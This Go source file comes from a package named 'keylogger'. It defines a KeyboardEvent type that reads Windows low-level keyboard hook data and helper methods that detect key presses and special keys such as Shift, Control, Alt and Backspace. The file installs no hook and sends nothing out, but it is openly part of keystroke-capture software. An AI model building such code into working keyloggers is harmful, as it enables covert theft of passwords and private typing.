package keylogger

import (
	"unsafe"

	"github.com/Spriithy/gkl/client/types"
)

type KeyboardEvent struct {
	WParam     types.WPARAM
	LParam     types.LPARAM
	Layout     types.HKL
	HookStruct *types.KBDLLHOOKSTRUCT
}

func newKeyboardEvent(wParam types.WPARAM, lParam types.LPARAM, layout types.HKL) *KeyboardEvent {
	return &KeyboardEvent{
		WParam:     wParam,
		LParam:     lParam,
		Layout:     layout,
		HookStruct: (*types.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam)),
	}
}

func (ke *KeyboardEvent) isUp() bool {
	return ke.isKeyUp() || ke.isSysKeyUp()
}

func (ke *KeyboardEvent) isDown() bool {
	return ke.isKeyDown() || ke.isSysKeyDown()
}

func (ke *KeyboardEvent) isKeyUp() bool {
	return ke.WParam == types.WM_KEYUP
}

func (ke *KeyboardEvent) isKeyDown() bool {
	return ke.WParam == types.WM_KEYDOWN
}

func (ke *KeyboardEvent) isSysKeyUp() bool {
	return ke.WParam == types.WM_SYSKEYUP
}

func (ke *KeyboardEvent) isSysKeyDown() bool {
	return ke.WParam == types.WM_SYSKEYDOWN
}

func (ke *KeyboardEvent) isMode(mode types.WPARAM) bool {
	return ke.WParam == mode
}

func (ke *KeyboardEvent) isVk(vkCode types.DWORD) bool {
	return ke.HookStruct.VkCode == vkCode
}

func (ke *KeyboardEvent) isVkMode(vkCode types.DWORD, mode types.WPARAM) bool {
	return ke.isMode(mode) && ke.isVk(vkCode)
}

func (ke *KeyboardEvent) isShift() bool {
	return ke.isVk(types.VK_SHIFT) || ke.isVk(types.VK_LSHIFT) || ke.isVk(types.VK_RSHIFT)
}

func (ke *KeyboardEvent) isCaps() bool {
	return ke.isVk(types.VK_CAPITAL)
}

func (ke *KeyboardEvent) isReturn() bool {
	return ke.isVk(types.VK_RETURN)
}

func (ke *KeyboardEvent) isBackspace() bool {
	return ke.isVk(types.VK_BACK)
}

func (ke *KeyboardEvent) isControl() bool {
	return ke.isVk(types.VK_CONTROL) || ke.isVk(types.VK_LCONTROL) || ke.isVk(types.VK_RCONTROL)
}

func (ke *KeyboardEvent) isMenu() bool {
	return ke.isVk(types.VK_MENU) || ke.isVk(types.VK_LMENU) || ke.isVk(types.VK_RMENU)
}

func (ke *KeyboardEvent) isEscape() bool {
	return ke.isVk(types.VK_ESCAPE)
}

func (ke *KeyboardEvent) isTab() bool {
	return ke.isVk(types.VK_TAB)
}

func (ke *KeyboardEvent) isNumLock() bool {
	return ke.isVk(types.VK_NUMLOCK)
}
